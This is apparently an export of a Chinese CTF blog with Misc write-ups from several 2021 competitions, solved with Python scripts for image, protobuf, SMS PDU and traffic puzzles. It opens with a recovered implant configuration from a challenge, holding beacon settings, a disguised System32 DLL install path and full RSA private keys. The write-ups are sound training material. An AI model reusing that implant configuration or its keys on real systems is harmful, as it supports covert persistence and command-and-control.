&lt;COMMAND_EXECUTE_TIMEOUT&gt;10&lt;/COMMAND_EXECUTE_TIMEOUT&gt; &lt;STATE_FILE_PATH&gt;.\\STATE_FILES&lt;/STATE_FILE_PATH&gt; &lt;MAX_CPU_UTILIZATION&gt;40&lt;/MAX_CPU_UTILIZATION&gt; &lt;MAX_PROCESSING_DATA_SIZE&gt;1000000&lt;/MAX_PROCESSING_DATA_SIZE&gt; &lt;MAX_CHUNK_SIZE&gt;0&lt;/MAX_CHUNK_SIZE&gt; &lt;BATCH_EXECUTION_TIMEOUT&gt;123&lt;/BATCH_EXECUTION_TIMEOUT&gt; &lt;/TASKING&gt; &lt;INSTALL&gt; &lt;RESTART_SERVICE&gt;1&lt;/RESTART_SERVICE&gt; &lt;TARGET_FILE_NAME&gt;%SystemRoot %\\System32\\Microsoft\\Crypto\\RAS\\iprcache.dll&lt;/TARGET_FILE_NAME&gt; &lt;ORIGINAL_FILE_NAME&gt;%SystemRoot%\\System32\\iprtrmgr.dll&lt;/ORIGINAL_FILE_NAME&gt; &lt;DATA_FILE_NAME&gt;%SystemRoot%\\System32\\codeintegrity\\ras.cache&lt;/DATA_FILE_NAME&gt; &lt;/INSTALL&gt; &lt;UNINSTALL&gt; &lt;KILL_FILE_PATH&gt;&lt;/KILL_FILE_PATH&gt; &lt;DEAD_MAN_DELAY&gt;0&lt;/DEAD_MAN_DELAY&gt; &lt;BEACON_FAILURES&gt;0&lt;/BEACON_FAILURES&gt; &lt;DATE_AND_TIME&gt;&lt;/DATE_AND_TIME&gt; &lt;/UNINSTALL&gt; &lt;BEACON&gt; &lt;BOOT_DELAY&gt;0&lt;/BOOT_DELAY&gt; &lt;DOMAINS&gt;10.3.2.56&lt;/DOMAINS&gt; &lt;PORT&gt;443&lt;/PORT&gt; &lt;JITTER&gt;0&lt;/JITTER&gt; &lt;USER_AGENT_STRING&gt;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0)&lt;/USER_AGENT_STRING&gt; &lt;ACCEPT_STRING&gt;&lt;/ACCEPT_STRING&gt; &lt;INTERVAL&gt;5&lt;/INTERVAL&gt; &lt;TASKING_DELAY&gt;0&lt;/TASKING_DELAY&gt; &lt;PROXY_PORT&gt;0&lt;/PROXY_PORT&gt; &lt;HIBERNATION_DELAY&gt;0&lt;/HIBERNATION_DELAY&gt; &lt;ACCEPT_LANG_STRING&gt;&lt;/ACCEPT_LANG_STRING&gt; &lt;IE_PROXY_ADDRESS&gt;&lt;/IE_PROXY_ADDRESS&gt; &lt;URL_PATH&gt;/octopus/&lt;/URL_PATH&gt; &lt;ACCEPT_ENCODING_STRING&gt;&lt;/ACCEPT_ENCODING_STRING&gt; &lt;WPAD_PROXY_ADDRESS&gt;&lt;/WPAD_PROXY_ADDRESS&gt; &lt;/BEACON&gt; &lt;CLIENT_KEY&gt; &lt;PUBLIC_KEY&gt;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1 mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI pQIDAQAB -----END PUBLIC KEY----- &lt;/PUBLIC_KEY&gt; &lt;PRIVATE_KEY&gt;-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7 v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5 ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2 YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje 0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ 9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG 7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7 efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3 -----END RSA PRIVATE KEY----- &lt;/PRIVATE_KEY&gt; &lt;/CLIENT_KEY&gt; &lt;SERVER_KEY&gt; &lt;PUBLIC_KEY&gt;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1 mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI pQIDAQAB -----END PUBLIC KEY----- &lt;/PUBLIC_KEY&gt; &lt;PRIVATE_KEY&gt;-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7 v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5 ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2 YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje 0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ 9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG 7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7 efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3 -----END RSA PRIVATE KEY----- &lt;/PRIVATE_KEY&gt; &lt;/SERVER_KEY&gt; &lt;SOURCE&gt; &lt;FLAG?&gt;TheyWereBelieversInTheGoddess&lt;/FLAG?&gt; &lt;/SOURCE&gt; &lt;TARGET&gt; &lt;CHILD_ID&gt;0xABCD0064&lt;/CHILD_ID&gt; &lt;DYN_CONFIG_TYPE&gt;0&lt;/DYN_CONFIG_TYPE&gt; &lt;PARENT_ID&gt;flag&lt;/PARENT_ID&gt; &lt;/TARGET&gt; &lt;/ATHENA&gt; 另外还提取出来个 Top_secret.zip，解压出来一个 client_secret.dat，里面是 &lt;data&gt; 6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569 &lt;sign&gt; 2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806 应该是数据和签名，拿密钥去解密应该就好了8 （后来去看其他比赛题目了…… 小结这个比赛比较基础，适合拿来摸🐟。 随便玩玩就好了，相对而言还是大一点的比赛题目质量更高一些。 （溜了溜了喵","path":"2021/05/30/CTF_2021DASCTF_May/"},{"title":"CTF | 2021 美团CTF Misc WriteUp","text":"引言 美团网络安全高校挑战赛 MT-CTF 比赛时间: 2021-05-23 09:00 ~ 2021-05-23 21:00 比赛官网: https://www.ichunqiu.com/meituan 周末有个美团 CTF，然而那天白天一直在赶 DDL，么得办法。 貌似也没啥师傅打这个比赛，感觉惨惨淡淡的。 （估计是决赛和其他比赛冲突的原因吧，摊手 到了晚上问了下别的师傅，说 misc 题没什么人做出来，于是吃完饭咱就来看了看。 MiscDifferent_Puzzle 这些图片好像不能用蛮力。 附件下载 提取码（GAME）备用下载 下载下来一个 null.vhd 这是一个 Windows 的虚拟磁盘文件，首先进计算机管理-磁盘管理，把盘挂上去。 得到一堆黑白相间的图片。 （flag.txt 是之后得到的） 图片高度都为100，宽度有所区别。盲猜是一维码了。 写个jio本合成一下。 其实写脚本的时候这里直接是 foremost 导出来的，按照 null.vhd 里存放的先后顺序。 import PIL.Image as Image import os IMAGES_PATH = r'.\\Misc_Different_Puzzle\\null.vhd_outfile\\png\\\\' IMAGE_SAVE_PATH = r'.\\Misc_Different_Puzzle\\\\' image_names = [x for x in os.listdir(IMAGES_PATH) if x.endswith('.png')] to_image = Image.new('RGB', (300, 100)) x = 0 for img in image_names: from_image = Image.open(IMAGES_PATH + img) im_size = from_image.size to_image.paste(from_image, (x, 0)) x += im_size[0] to_image.show() to_image.save('decode.png') # EuO9&amp;cDH 扫码得到 EuO9&amp;cDH 然后在 flag.exe 输入就能得到 flag.txt 打开就是 flag。 flag{af26d693-2de2-4b16-be49-d95e83a43f76} pixel Colorful pixel image. 附件下载 提取码（GAME）备用下载 Hint: do you know knn? 这题做的时候咱就猜是不是要用机器学习来做个二分类，果然在比赛结束前十几分钟放了个 hint 说是 KNN，实锤了。 （只不过没时间做了倒是了 开局一张图加一个 txt。 useful.txt 一共 88209 行数据，正好是 297x297。 那说不定括号里就是 (R, G, B, A)，把对应的颜色映射为 0 和 1，那就是二维码了吧。 写个 jio 本复原一下。 import re from PIL import Image with open('useful.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') # print(l) re_info = re.compile(r'(\\d) &lt;--- (\\(.*\\))') data = {} for x in l: info = re_info.search(x) data[info[2]] = info[1] # print(data) im = Image.open('pixel.png') print(im.size) # (297, 297) width = im.width height = im.height im2 = Image.new('RGBA', im.size) for j in range(height): for i in range(width): x = im.getpixel((i, j)) if data[str(x)] == '1': im2.putpixel((i, j), (0, 0, 0)) # else: # im2.putpixel((i, j), (255, 255, 255)) # im2.show() im2.save('decrypt2.png') 得到一张二维码。 扫描 QR 得到 8c8040579121e55ca4c58f9，拿去解压。 得到还是一张像素点混乱的图和一个和之前类似的文本。 但是这次的 RGBA 并不能对应上。 于是考虑是不是要做个二分类，就把四维的 RGBA 分为两类，分别对应着黑和白两种结果。 首先用所给的数据作为训练集得到一个模型，然后在 flag.png 上作为测试集进行预测，从而得到一个黑白图像，大概率也是 QR码 或者 比较容易辨识的图形。 参考 KNN分类算法原理及实现及sklearn中的使用方法，机器学习之KNN最邻近分类算法 咱就整个 KNN 出来吧。 这里直接用 sklearn 里自带的 KNN 来实现了。 # 导入画图工具 import matplotlib.pyplot as plt # 导入数组工具 import numpy as np # 导入数据集生成器 from sklearn.datasets import make_blobs # 导入KNN 分类器 from sklearn.neighbors import KNeighborsClassifier # 导入数据集拆分工具 from sklearn.model_selection import train_test_split import re from PIL import Image with open('flag/hint.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') re_info = re.compile(r'(\\d) &lt;--- (\\(.*\\))') X = [] Y = [] for x in l: info = re_info.search(x) tmp1 = int(info[1]) tmp2 = eval(info[2]) X.append(tmp2) Y.append(tmp1) clf = KNeighborsClassifier() clf.fit(X, Y) im = Image.open('flag/flag.png') print(im.size) # (297, 297) width = im.width height = im.height im2 = Image.new('RGBA', im.size) for j in range(height): for i in range(width): x = im.getpixel((i, j)) res = clf.predict([x])[0] print(res) if res == 1: im2.putpixel((i, j), (0, 0, 0)) im2.show() im2.save('decrypt2.png') 虽然有点模糊，但缩小一点还是能扫出来的。 flag{7he_p!xe1_wi7h_0ff5et} 小结真就遇事不决，机器学习呗！ 其他题倒没怎么看，咱只是佛系做做罢了。 唉，喵喵菜菜，爬走了。 （溜了溜了喵","path":"2021/05/26/CTF_2021MeiTuan/"},{"title":"CTF | 2021 CISCN初赛 Misc WriteUp","text":"引言 2021 全国大学生信息安全竞赛创新实践能力赛 (CISCN) 比赛时间: 2021-05-15 09:00 ~ 2021-05-16 09:00 比赛官网: http://www.ciscn.cn/ 一年一度的国赛又来了，连续打 24h 太难受啦！ 今年国赛正好碰上咱 ddl，打完国赛又去赶 ddl 去了，太难顶了。 于是一直也没时间来整理 WriteUp，今天摸鱼，就来写几道 misc 题目好了。 第一阶段tiny traffic抓包文件导出 http 对象 192.168.2.1 是路由器，192.168.2.193 是台 NAS，5000端口开了个 python web 服务。看上去最后的是个 rpc flag_wrapper 导出内容，解压之后得到 test 和 secret 用 brotli 解压 import brotli with open('test', 'rb') as fin: s = fin.read() x = brotli.decompress(s).decode() print(x) with open('secret', 'rb') as fin: s2 = fin.read() y = brotli.decompress(s2) print(y) with open('secret1', 'wb') as fout: fout.write(y) 发现 test 是 Protocol Buffzers 参考 https://github.com/MonsterMeng92/protobuf/blob/master/docs/%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97(proto3).md syntax = \"proto3\"; message PBResponse { int32 code = 1; int64 flag_part_convert_to_hex_plz = 2; message data { string junk_data = 2; string flag_part = 1; } repeated data dataList = 3; int32 flag_part_plz_convert_to_hex = 4; string flag_last_part = 5; } message PBRequest { string cate_id = 1; int32 page = 2; int32 pageSize = 3; } 里面定义了传输中的格式。 而secret 是序列化后的密文。 参考 Protobuf协议逆向解析-APP爬虫 先下载 Protobuf 编译器和调用编译器的接口，这里直接用 python 了 https://github.com/protocolbuffers/protobuf/releases/ 解码得到 1: 200 2: 15100450 3 { 1 { 12: 0x35343332 } 2: \"7af2c\" } 3 { 1: \"7889b0\" 2: \"82bc0\" } 4: 16453958 5: \"d172a38dc\" 发现并不是很清楚，先生成 python 代码 protoc.exe test.proto --python_out=. 然后写个脚本解码 import test_pb2 r = test_pb2.PBResponse() with open('secret1', 'rb') as fin: s = fin.read() r.ParseFromString(s) print(r) 得到 code: 200 flag_part_convert_to_hex_plz: 15100450 dataList { flag_part: \"e2345\" junk_data: \"7af2c\" } dataList { flag_part: \"7889b0\" junk_data: \"82bc0\" } flag_part_plz_convert_to_hex: 16453958 flag_last_part: \"d172a38dc\" 拼成 flag，其中 junk_data 是垃圾数据不要 CISCN{e66a22e23457889b0fb1146d172a38dc} running_pixel开局一张动图 一共有 382 帧，逐帧查看，导出每一帧。 import os from PIL import Image, ImageSequence def parseGIF(gifname): # 将gif解析为图片 # 读取GIF im = Image.open(gifname) # GIF图片流的迭代器 iter = ImageSequence.Iterator(im) # 获取文件名 file_name = gifname.split(\".\")[0] index = 1 # 判断目录是否存在 pic_dirct = \"imgs/{0}\".format(file_name) def mkdirlambda(x): return os.makedirs( x) if not os.path.exists(x) else True # 目录是否存在,不存在则创建 mkdirlambda(pic_dirct) # 遍历图片流的每一帧 for frame in iter: print(\"image %d: mode %s, size %s\" % (index, frame.mode, frame.size)) frame.save(\"imgs/%s/frame%d.png\" % (file_name, index)) index += 1 if __name__ == \"__main__\": parseGIF(\"running_pixel.gif\") 随意看前几帧，放大来看，发现有个像素点在动。 所以题目名称中的跑动的像素应该就是这个了。 提取得到这个像素点颜色 RGB 为 (233, 233, 233)，而背景色是 (247, 247, 247) 另外发现每隔一定帧数，这个像素点会消失，然后在另一个地方出现。 于是写个脚本跑所有的帧，把这个像素点的轨迹画出来，每消失一次保存一张图片。 \"\"\" MiaoTony \"\"\" import cv2 import os from PIL import Image, ImageOps import numpy as np im2 = Image.new('RGB', (400, 400)) last_cnt = 0 # list(os.walk('imgs'))[0][2] for cnt in range(1, 383): img_name = f'imgs/frame{cnt}.png' im = Image.open(img_name) rgb_im = im.convert('RGB') # print(rgb_im.size) # (400, 400) width = rgb_im.width height = rgb_im.height for j in range(height): for i in range(width): r, g, b = rgb_im.getpixel((i, j)) if (r, g, b) == (233, 233, 233): # print('cnt', cnt) # print(i, j) if cnt != last_cnt + 1: print(cnt) im2.save(f'cnt{cnt}.png') im2.putpixel((j, i), (255, 255, 255)) last_cnt = cnt im2.show() im2.save('final.png') 最后的图是这样的。 手动按顺序把出来的图片各个字母提取出来。 （其实更好的思路是每次像素点消失的时候新建一张图的……看的要眼瞎了 出来是个 UUID 的格式。 12504D0F-9DE1-4B00-87A5-A5FDD0986A00 裹上 CISCN，然后发现 19:00，草，交不上去了！ 心态炸了！！！ （后来看大佬 wp 说这里还要转成小写再交上去 CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00} 第二阶段隔空传话 题目描述：Alice 和 Bob 进行隔空传话的时候被我“偷听”到了，你能帮我分析分析他们在交流什么吗？注意：flag形式：CISCN{XXXXX} 你们又在加密通信！！！ （这题复现的，然而过去有一段时间了，当时找的资料忘记记录了，现在又懒得再找了，就佛系写一写8 （还是去找了下资料 唉 开局给了一堆格式类似的数据。 查了一下发现是 SMS 短信里用的 PDU 编码。 PDU 编码规则 还找到了 在线 PDU 格式编码/解码的网站 https://tool.letmetellyou.xyz/pdu/ 或者 http://www.sendsms.cn/pdu/ 在 pypi 找到了一个 python 的 module： smspdu 手动解码前几条 发现是 hello,bob!what is the flag? the first part of the flag is the first 8 digits of your phone number 那其他部分呢 看看你能从这些数据里发现什么？w465 5b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8 f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf ... flag 的第一部分是号码的前8位，+8615030442000，那就是 15030442。 之后就一堆 hex 编码。 写个脚本提取并导出到文件。 from smspdu.codecs import GSM, UCS2 from smspdu.easy import easy_sms from binascii import unhexlify # x = easy_sms('04910180F6040D91685130402400F0000012405291443408A0E65A381723DFC6E21ACD4C868971B3724E76138BCDE2F28D6C0BC76431F24C66A3E56E349C99569B8DC330B3D86C2ED76C319B6C5C2BD7C6B4F2CC7CABDD70305A39172E8B63B7304E4CA3C56AB1D9F886ABE56263DA6C9CA3E56662B1AC66BB8D6D61DAAD56B6E5C6B55C2E261BE7CA3233EC86AB99CBB4D9CD160BD764B3B2397C1BDF68B75CD96C268BCD') # print(x) with open('data.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') l1 = l[4:] x = '' for i in l1: tmp = easy_sms(i)['content'] print(tmp) x += tmp print(x) # x.encode() y = unhexlify(x) with open('decode.dat', 'wb') as fout: fout.write(y) binwalk 一下发现有张 png 图片，提取出来。 然而发现打不开…… 然后比赛的时候试了用 PCRT 来修复，但没成功。网上找了个工具然后要收钱，气死喵喵了！！！ 后来发现需要按照时间顺序排序。 唉好烦（ \"\"\" MiaoTony \"\"\" from smspdu.codecs import GSM, UCS2 from smspdu.easy import easy_sms from binascii import unhexlify with open('data.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') l1 = l[4:] x = [] ts = [] for i in l1: tmp = easy_sms(i) content = tmp['content'] t = tmp['date'] x.append(content) ts.append(t) l2 = sorted(zip(x, ts), key=lambda x: x[1]) l3 = list(zip(*l2))[0] info = ''.join(l3) # type(info) # str y = unhexlify(info) with open('decode2.dat', 'wb') as fout: fout.write(y) 得到一张图，终于能打开了，而且整个数据就是一整张图片。然而还是没思路。 看了大佬们的 wp 才发现，w465 是宽度为 465 的意思……草！ 改了之后得到 于是 flag 就是 CISCN{15030442_b586_4c9e_b436_26def12293e4} 第三阶段robot 题目描述：分析给出的机器人仿真程序和流量包，提取机器人控制程序控制机器人写出的字符串，flag为”CISCN{md5(机器人绘制的字符串)}”（md5值小写） Robot.rspag 是 RobotStudio 文件，cap.pcapng 是网络流量抓包，Control 目录下是一个图形化的基于 C# 写的一个图形化上位机，以及对应的 dll 文件。 用 ILSPY 反汇编 exe，发现其实都是调用底层 dll 提供的 SDK 接口，并没有自己去实现网络通信相关的功能。 参考相关的资料也是如此。 https://blog.csdn.net/weixin_39090239/article/details/81275759 https://blog.csdn.net/weixin_42837024/article/details/100542204 https://zhuanlan.zhihu.com/p/62390089?ivk_sa=1024320u https://developercenter.robotstudio.com/ 之后在流量里发现有一系列设置坐标的，盲猜这个就是机器人画的东西了。 于是写个脚本提取一下，画张图。 \"\"\" MiaoTony \"\"\" import re import cv2 import os from PIL import Image import numpy as np im = Image.new('RGB', (400, 400)) width = im.width height = im.height with open('test.dat', 'r', encoding='utf-8') as fin: s = fin.read() re_pos = re.compile(r'tgPos{(\\d+)}\\.Value\\.(\\[\\d+,\\d+,\\d+\\])') l = re_pos.findall(s, re.M) with open('data.dat', 'w', encoding='utf-8') as fout: fout.write(str(l)) points = [eval(x[1])[:2] for x in l] # l = [[27, 36, 0], [28, 35, 0], [29, 35, 0], [31, 35, 0], [32, 35, 0], [33, 35, 0], [35, 35, 0], # [36, 35, 0], [37, 35, 0], [39, 34, 0]] for i in points: im.putpixel(i, (255, 255, 255)) im.show() im.save('info.png') # easy_robo_xx 还原出来机器人绘制的字符串为 easy_robo_xx md5 d4f1fb80bc11ffd722861367747c0f10 CISCN{d4f1fb80bc11ffd722861367747c0f10} 小结感谢 360 首次将 CTF 靶场变成了考场。 初赛就这么肝也太顶了，打不动了 Orz 华东北赛区也太卷了吧，喵呜呜呜。 唉，不过咱没进复赛，喵呜呜呜呜。 害，问题不大，可能也是最后一次国赛了吧，难得大师傅们带咱玩，也非常感谢队友一起打。 之后大佬们好好玩，咱溜了溜了喵。","path":"2021/05/25/CTF_2021CISCN_preliminary/"},{"title":"CTF | 2021 红帽杯 WriteUp","text":"引言 第四届“红帽杯”网络安全大赛 比赛时间：2021年5月9日10:00-18:00 https://race.ichunqiu.com/2021redhat 前段时间打了个红帽杯，不过这段时间一直在忙没空整理 Writeup。 趁着今天摸鱼，复现了两道 Misc 题。其他就简单记录一下吧。 Misc签到EBCDIC 编码 flag{we1c0me_t0_redhat2021} colorful code colorful code is beautiful, isn’t it? 最终得到flag的格式中加上flag{}包裹再提交 附件下载 提取码（GAME）备用下载 下载下来两个 data{1,2} data1 是一串 0-19 之间的数字 data2 是一堆奇奇怪怪但又有规律的字符 而 data2 这最前面的东西好像颜色的标识啊。就类似于 #FF0000 这样。 于是发现可能是 npiet。 参考 https://www.dangermouse.net/esoteric/piet.html Piet is a programming language in which programs look like abstract paintings. The language is named after Piet Mondrian, who pioneered the field of geometric abstract art. I would have liked to call the language Mondrian, but someone beat me to it with a rather mundane-looking scripting language. Oh well, we can’t all be esoteric language writers I suppose. 参考 https://www.bertnase.de/npiet/ npiet is an interpreter for piet programs and takes as input a portable pixmap (a ppm file) and since v0.3a png and gif files too - other formats may follow. 这是一种基于图像颜色的编程语言，当然还有其他有意思而神秘的编程语言，详见 Esoteric programming language。 统计一下 data1 总共有 7076 个数字，分解质因数 得到为 37*191。 考虑这就是图像的宽和高了。 按照原版的映射，颜色应该对应是下图这样的。 然而这题里魔改了一下，就根据 data2 重新映射一下。 写个 jio本。 \"\"\" MiaoTony \"\"\" from PIL import Image with open('data1', 'r') as fin: s = fin.read() # print(s) l = s.split(' ')[:-1] # print(len(l)) # 7067 # 分解质因数 http://tools.jb51.net/jisuanqi/factor_calc # 37*191 x = 37 y = 191 c = Image.new(\"RGB\", (x, y)) # 原版映射 # colors = [\"FFC0C0\", \"FFFFC0\", \"C0FFC0\", # \"C0FFFF\", \"C0C0FF\", \"FFC0FF\", # \"FF0000\", \"FFFF00\", \"00FF00\", # \"00FFFF\", \"0000FF\", \"FF00FF\", # \"C00000\", \"C0C000\", \"00C000\", # \"00C0C0\", \"0000C0\", \"C000C0\", # \"000000\", \"FFFFFF\"] # 按照 data2 前20个像素来映射 colors = ['000000', '0000C0', '00FFFF', '00FF00', 'FFC0FF', 'FFC0C0', 'C0C0FF', 'C0C000', 'FF00FF', 'FF0000', 'C00000', 'C000C0', 'FFFFFF', 'FFFF00', 'FFFFC0', '00C000', '00C0C0', 'C0FFFF', 'C0FFC0', '0000FF'] def hex2int(h): return (int(h[:2], 16), int(h[2:4], 16), int(h[4:6], 16)) cnt = 0 for i in range(0, x): for j in range(0, y): color = colors[int(l[cnt])] c.putpixel([i, j], hex2int(color)) cnt += 1 c.show() c.save(\"c.png\") 得到 再到 npiet online 上去执行一下，就能拿到 flag 了。 flag{88842f20-fb8c-45c9-ae8f-36135b6a0f11} PicPic 你想成为CV大师嘛？ 附件下载 提取码（GAME）备用下载 challenge 1create.py import os import cv2 import struct import numpy as np def mapping(data, down=0, up=255, tp=np.uint8): data_max = data.max() data_min = data.min() interval = 